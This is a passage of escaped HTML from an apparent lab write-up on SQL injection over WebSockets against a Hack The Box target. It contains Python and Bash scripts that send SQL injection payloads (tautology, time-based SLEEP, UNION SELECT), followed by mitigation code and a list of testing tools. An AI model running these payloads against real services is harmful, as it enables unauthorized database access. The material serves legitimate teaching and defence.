class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003epayloads\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Sending: \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ews\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ewebsocket\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eWebSocketApp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"n\"\u003eon_open\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eon_open\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"n\"\u003eon_message\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eon_message\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"n\"\u003eon_error\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eon_error\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"n\"\u003eon_close\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eon_close\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erun_forever\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003epayloads\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND SLEEP(5)-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1 UNION SELECT @@version-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etest_websocket_sqli\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ws://target:9091\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epayloads\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"bash-testing-script\"\u003eBash Testing Script\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# WebSocket SQLi Testing Script\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eURL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Testing WebSocket SQL Injection\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Target: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$URL\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Array of payloads to test\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003epayloads\u003c/span\u003e\u003cspan class=\"o\"\u003e=(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;92130 or 5=1-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1 AND SLEEP(5)-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;1 UNION SELECT @@version-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e payload in \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003epayloads\u003c/span\u003e\u003cspan class=\"p\"\u003e[@]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Testing payload: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$payload\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;{\\\u0026#34;id\\\u0026#34;:\\\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$payload\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\\u0026#34;}\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e wscat -c \u003cspan class=\"nv\"\u003e$URL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    sleep \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"mitigation-and-prevention\"\u003eMitigation and Prevention\u003c/h2\u003e\n\u003ch3 id=\"secure-websocket-implementation\"\u003eSecure WebSocket Implementation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Input validation\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003evalidateInput\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e// Whitelist allowed characters\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"sr\"\u003e/^[a-zA-Z0-9_-]+$/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ethrow\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Invalid input\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Parameterized queries\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003equery\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003edb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003equery\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003equery\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003euserId\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Prepared statements\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003estmt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003edb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eprepare\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estmt\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003euserId\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"websocket-security-headers\"\u003eWebSocket Security Headers\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Implement proper authentication\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;connection\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e// Verify JWT token or session\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003eisAuthenticated\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003esocket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1008\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Authentication required\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Rate limiting\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003erateLimiter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;message\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eclientId\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003egetClientId\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisRateLimited\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eclientId\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1008\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Rate limit exceeded\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"tools-and-resources\"\u003eTools and Resources\u003c/h2\u003e\n\u003ch3 id=\"websocket-testing-tools\"\u003eWebSocket Testing Tools\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ewscat\u003c/strong\u003e - Command-line WebSocket client\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBurp Suite\u003c/strong\u003e - Professional WebSocket testing\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOWASP ZAP\u003c/strong\u003e - Free WebSocket proxy\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ewebsocat\u003c/strong\u003e - Advanced WebSocket client\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003esqlmap\u003c/strong\u003e - Automated SQL injection testing\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"browser-developer-tools\"\u003eBrowser Developer Tools\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Chrome/Firefox WebSocket inspection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 1. Open Developer Tools (F12)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 2. Go to Network tab\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 